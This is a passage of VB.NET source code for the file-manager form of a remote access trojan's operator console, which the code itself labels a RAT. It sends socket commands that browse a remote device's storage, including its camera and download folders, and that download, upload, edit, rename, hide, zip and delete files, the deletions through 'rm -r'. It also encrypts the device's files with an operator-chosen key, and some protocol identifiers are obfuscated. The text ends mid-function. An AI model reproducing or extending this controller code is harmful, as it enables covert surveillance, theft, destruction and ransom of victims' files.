Imports System.IO
 Public Class Frm_FileManager
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public Title As String = "null"
     Public ver As String = "n/a"
     Public Correntindex As Int32 = 1
     Private BoxTitlePaintEventArgsWait As Boolean = False
     Private FSize As String = "Large text editing is not allowed {1}  -->{0}"
     Private Q As String = "20"
     Public ShowVideo As Boolean = False
      Public DownFolder As String
     Public DownStreams As Collection = New Collection()
       Dim FileDirectory As String = Frm_Config_Settings.res_Path & "\Thumbs"
                   Private Sub SpyStyle()
        BoxTitle.BackColor = SpySettings.DefaultColor_Background
    End Sub
    Dim rc As Frm_Config_ResizeableControl
    Private Sub FileManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
           Me.ActiveControl = Me.DGV0 'Me.Panel3.Width = 0
        Me.Tag = classClient.ClientAddressIP
          Timer1.Start()
        Me.Q = Convert.ToString(My.Settings.ImageQualty)
            Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\9.ico")
        Me.usrscreen.Image = Me.classClient.Screen
        Me.Usrbtry.Image = classClient.Battery
        Me.usrnetwork.Image = classClient.Wifi
        ''SpyStyle()
        'DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
        ' DGV0.DefaultCellStyle.Font = reso.f
        ''Me.ctxMenu.Renderer = New ThemeToolStrip
        'Me.Text = Title
        ' OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''OpenToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\open.png")
        'OpenToolStripMenuItem.Tag = {0, "null", "null"}
        ' DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''DownloadToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\download.png")
        'DownloadToolStripMenuItem.Tag = {0, "null", "null"}
        ' UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''UploadToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\upload.png")
        'UploadToolStripMenuItem.Tag = {0, "null", "null"}
        ' EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''EncryptToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\encrypt.png")
        'EncryptToolStripMenuItem.Tag = {0, "null", "null"}
        ' DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''DecodeToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\decode.png")
        'DecodeToolStripMenuItem.Tag = {0, "null", "null"}
        ' ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''ZipToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\zip.png")
        'ZipToolStripMenuItem.Tag = {0, "null", "null"}
        ' UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''UnZipToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\unzip.png")
        'UnZipToolStripMenuItem.Tag = {0, "null", "null"}
        ' DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''DeleteToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\delete.png")
        'DeleteToolStripMenuItem.Tag = {0, "null", "null"}
        ' AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''AddFilesToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\add.png")
        'AddFilesToolStripMenuItem.Tag = {0, "null", "null"}
        ' RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''RenameToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\rename.png")
        'RenameToolStripMenuItem.Tag = {0, "null", "null"}
        ' EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''EditToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\edit.png")
        'EditToolStripMenuItem.Tag = {0, "null", "null"}
        ' HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''HideToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\hidden.png")
        'HideToolStripMenuItem.Tag = {0, "null", "null"}
        ' ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''ShowToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\show.png")
        'ShowToolStripMenuItem.Tag = {0, "null", "null"}
        ' FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''FolderDownloadsToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\downloads.png")
        'FolderDownloadsToolStripMenuItem.Tag = {0, "null", "null"}
        ' CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''CutToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\cut.png")
        'CutToolStripMenuItem.Tag = {0, "null", "null"}
        ' CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''CopyToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\copy.png")
        'CopyToolStripMenuItem.Tag = {0, "null", "null"}
        ' PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''PasteToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\paste.png")
        'PasteToolStripMenuItem.Tag = {0, "null", "null"}
        ' SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''SetWallpaperToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\wallpaper.png")
        'SetWallpaperToolStripMenuItem.Tag = {0, "null", "null"}
        ' PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ''PlaySoundToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\playsound.png")
        'PlaySoundToolStripMenuItem.Tag = {0, "null", "null"}
        Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
         BoxTitlePaintEventArgsWait = True
     End Sub
     Private Sub DGV0_SortCompare(sender As Object, e As DataGridViewSortCompareEventArgs) Handles DGV0.SortCompare
         If e.RowIndex1 = 0 Then
             e.Handled = True
         End If
     End Sub
    Private Sub DGV0_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV0.CellMouseDoubleClick
         If DGV0.CurrentRow.Index > Correntindex Or DGV0.CurrentRow.Index = Correntindex - 1 Then
            Correntindex = DGV0.CurrentRow.Index
        End If
         If e.RowIndex > 0 AndAlso e.ColumnIndex >= 0 Then
             If DGV0.Rows.Item(e.RowIndex).Cells(0).Tag = "0" Then
                 If Not classClient Is Nothing Then
                    Dim obj As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & Pnext(DGV0.Tag, DGV0.Rows.Item(e.RowIndex).Cells(1).Value), Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(obj)
                End If
            Else
                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(e.RowIndex).Cells(1).Value
                Dim tg As String = DGV0.Rows.Item(e.RowIndex).Cells(0).Tag
                Dim t As String = DGV0.Rows(e.RowIndex).Cells(1).Value
                If tg = "1" Then
                    If ISupportedText(t.ToLower) Then
                        Dim getSize As Object = DGV0.Rows.Item(e.RowIndex).Cells(2).Tag
                        Dim CheckSize As Boolean = If(getSize <= 500 * 1024, True, False)
                        If CheckSize Then
                            If Not classClient Is Nothing Then
                                Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.editor & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & p, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                classClient.SendAsync(objs)
                            End If
                        Else
                            MsgBox(String.Format(FSize, DGV0.Rows.Item(e.RowIndex).Cells(2).Value, DGV0.Rows.Item(e.RowIndex).Cells(1).Value), MsgBoxStyle.Critical, Frm_Config_Settings.nameRAT)
                        End If
                    Else
                        Dim status As Object = "null"
                        If ISupportedImages(t.ToLower) Then
                            status = "false"
                        ElseIf ISupportedVideo(t.ToLower) Then
                            status = "true"
                        Else
                            status = "null"
                        End If
                        If Not status = "null" Then
                            If Not classClient Is Nothing Then
                                Dim spl As String() = classClient.Keys.Split(":")
                                Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & Authentication_users.aVnydnannovCiwfayBayMfzeuVNxvyVzmByxyMmNafnVibbadc, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                classClient.SendAsync(objs)
                            End If
                        End If
                    End If
                End If
            End If
        ElseIf e.RowIndex = 0 AndAlso e.ColumnIndex >= 0 Then
            If Not classClient Is Nothing Then
                Dim obj As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & Pback(DGV0.Tag), Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                classClient.SendAsync(obj)
            End If
        End If
    End Sub
    Private Function Pback(ByVal p As String)
        Dim a As String = String.Format("{0}", p.Substring(0, p.LastIndexOf("/")))
        Return If(a.Contains("/"), a, "/")
    End Function
    Private Function Pnext(ByVal p As String, ByVal n As String)
        Return String.Format("{0}/{1}", p, n)
    End Function
    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    If Not classClient Is Nothing Then
                        Dim spl As String() = classClient.Keys.Split(":")
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "download" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & Authentication_users.ywCvCBbcutvoVCrvnauyzBgqvgbfurMbMbgodCbuuVvoyivpVe & sockets.Data.SPL_DATA & Authentication_users.oyuwnvpwvzByfconytvywdibuxxBoeouxuvpCzcoBsnNfcixvy & sockets.Data.SPL_DATA & classClient.UUID, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            FilesUpload.Title = "Please select Files"
            FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            FilesUpload.Filter = "all Files|*.*"
            FilesUpload.FileName = String.Empty
            FilesUpload.Multiselect = True
            If FilesUpload.ShowDialog() = DialogResult.OK Then
                If Not classClient Is Nothing Then
                    Dim ar As String() = FilesUpload.FileNames
                    If ar.Length > 0 Then
                        For Each i In ar
                            Dim spl As String() = classClient.Keys.Split(":")
                            Try
                                Dim FI As New IO.FileInfo(i)
                                Dim si As String = CStr(FI.Length)
                                Dim p As String = DGV0.Tag & "/" & FI.Name
                                Dim nm As String = FI.Name
                                Dim funm As String = FI.FullName
                                Dim obj As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "upload" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & si & sockets.Data.SPL_DATA & nm & sockets.Data.SPL_DATA & funm & sockets.Data.SPL_DATA & Authentication_users.uwzvczVCByvstNygiCngpvsibeCbuBzaNzxyCVcsumicBMaBMM & sockets.Data.SPL_DATA & Authentication_users.BevxaiocvpcNqVzpVrpwupxpxopiotnMeuqzgnuvmwzzyzoNdB, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                classClient.SendAsync(obj)
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub ViewToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim t As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim status As Object = "null"
                    If ISupportedImages(t.ToLower) Then
                        status = "false"
                    ElseIf ISupportedVideo(t.ToLower) Then
                        status = "true"
                    Else
                        status = "null"
                    End If
                    If Not status = "null" Then
                        If Not classClient Is Nothing Then
                            Dim spl As String() = classClient.Keys.Split(":")
                            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & Authentication_users.aVnydnannovCiwfayBayMfzeuVNxvyVzmByxyMmNafnVibbadc, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                            classClient.SendAsync(objs)
                        End If
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub ExternalStorageDirectoryToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub DirectoryDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get1", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub DirectoryPicturesToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get2", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub DirectoryDCIMToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get3", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub CustomToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim p As New Frm_inp
        p.Text = "Access Path"
        p.LTitle.Text = "Add path"
        p.InputText.Text = If(DGV0.Tag.ToString.Length = 0, "/", DGV0.Tag.ToString)
        p.StartPosition = FormStartPosition.Manual
        p.Location = Frm_Config_Codes.FixSize(Me, p)
        Dim getPATH As String = Nothing
        Select Case p.ShowDialog(Me)
            Case DialogResult.OK
                If Not classClient Is Nothing Then
                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & p.InputText.Text, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(objs)
                End If
        End Select
        p.Close()
    End Sub
    Private Sub FolderDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FolderDownloadsToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim down As String = classClient.FolderUSER & "\Downloads"
            If Not IO.Directory.Exists(down) Then
                IO.Directory.CreateDirectory(down)
            End If
            Process.Start(down)
        End If
    End Sub
    Private Sub DecodeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecodeToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim pd As New Frm_inp
            pd.Text = "decryption"
            pd.LTitle.Text = "Add decryption key"
            pd.InputText.Text = My.Settings.EncryptionKey
            pd.StartPosition = FormStartPosition.Manual
            pd.Location = Frm_Config_Codes.FixSize(Me, pd)
            Select Case pd.ShowDialog(Me)
                Case DialogResult.OK
                    If Not classClient Is Nothing Then
                        If DGV0.SelectedRows.Count > 0 Then
                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                                If tg = "1" Then
                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                                    Dim out As String = Nothing
                                    Dim concat As String = ".crypt"
                                    If p.EndsWith(concat) Then
                                        Dim iLast As Integer = p.LastIndexOf(concat)
                                        out = p.Substring(0, iLast)
                                    Else
                                        out = p & ".decrypt"
                                    End If
                                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "decrypt" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & out & sockets.Data.SPL_DATA & pd.InputText.Text, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                    classClient.SendAsync(objs)
                                End If
                            Next
                        End If
                    End If
            End Select
            pd.Close()
        End If
    End Sub
    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim pd As New Frm_inp
            pd.Text = "encryption"
            pd.LTitle.Text = "Add encryption key"
            pd.InputText.Text = My.Settings.EncryptionKey
            pd.StartPosition = FormStartPosition.Manual
            pd.Location = Frm_Config_Codes.FixSize(Me, pd)
            Select Case pd.ShowDialog(Me)
                Case DialogResult.OK
                    If Not classClient Is Nothing Then
                        If DGV0.SelectedRows.Count > 0 Then
                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                                If tg = "1" Then
                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                                    Dim out As String = Nothing
                                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "encrypt" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & ".crypt" & sockets.Data.SPL_DATA & pd.InputText.Text, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                    classClient.SendAsync(objs)
                                    My.Settings.EncryptionKey = pd.InputText.Text
                                    My.Settings.Save()
                                End If
                            Next
                        End If
                    End If
            End Select
            pd.Close()
        End If
    End Sub
    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                Dim sn As String = "del0"
                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                If tg = "0" Then
                    sn = "del1"
                    Dim frmt As String = p
                    p = "rm -r" & Space(1) & Format_Space(frmt)
                End If
                If Not classClient Is Nothing Then
                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & sn & sockets.Data.SPL_DATA & p, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(objs)
                    If Not tg = "back" Then
                        DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim getSize As Object = DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(2).Tag
                    Dim CheckSize As Boolean = If(getSize <= 500 * 1024, True, False)
                    If CheckSize Then
                        If Not classClient Is Nothing Then
                            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.editor & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & p, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                            classClient.SendAsync(objs)
                        End If
                    Else
                        MsgBox(String.Format(FSize, DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(2).Value, DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(1).Value), MsgBoxStyle.Critical, Frm_Config_Settings.nameRAT)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub ZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZipToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim pd As New Frm_inp
            pd.Text = "Zip"
            pd.LTitle.Text = "File Name"
            pd.InputText.Text = "new file.zip"
            pd.StartPosition = FormStartPosition.Manual
            pd.Location = Frm_Config_Codes.FixSize(Me, pd)
            Dim sb As New Text.StringBuilder
            Select Case pd.ShowDialog(Me)
                Case DialogResult.OK
                    If Not classClient Is Nothing Then
                        If DGV0.SelectedRows.Count > 0 Then
                            Dim pathFile As String = DGV0.Tag & "/" & pd.InputText.Text
                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                                If tg = "1" Then
                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                                    sb.Append(p & sockets.Data.SPL_LINE)
                                End If
                            Next
                            If sb.ToString.Length > 0 Then
                                Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "zip" & sockets.Data.SPL_DATA & sb.ToString & sockets.Data.SPL_DATA & pathFile, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                classClient.SendAsync(objs)
                            End If
                        End If
                    End If
            End Select
            pd.Close()
        End If
    End Sub
    Private Sub UnZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnZipToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim here As String = DGV0.Tag & "/"
                    If Not classClient Is Nothing Then
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "unzip" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & here, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            If DGV0.SelectedRows.Count = 1 Then
                Dim pd As New Frm_inp
                pd.Text = "Rename"
                pd.LTitle.Text = "new Name"
                pd.StartPosition = FormStartPosition.Manual
                pd.Location = Frm_Config_Codes.FixSize(Me, pd)
                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                    pd.InputText.Text = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                Next
                Select Case pd.ShowDialog(Me)
                    Case DialogResult.OK
                        If Not classClient Is Nothing Then
                            If DGV0.SelectedRows.Count = 1 Then
                                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                                    Dim old As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                                    Dim neew As String = DGV0.Tag & "/" & pd.InputText.Text
                                    If Not old = neew Then
                                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                        classClient.SendAsync(objs)
                                    End If
                                Next
                            End If
                        End If
                End Select
                pd.Close()
            End If
        End If
    End Sub
    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then
                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    If Not name.Trim.Chars(0) = "."c Then
                        Dim neew As String = DGV0.Tag & "/." & name
                        Dim old As String = DGV0.Tag & "/" & name
                        If Not classClient Is Nothing Then
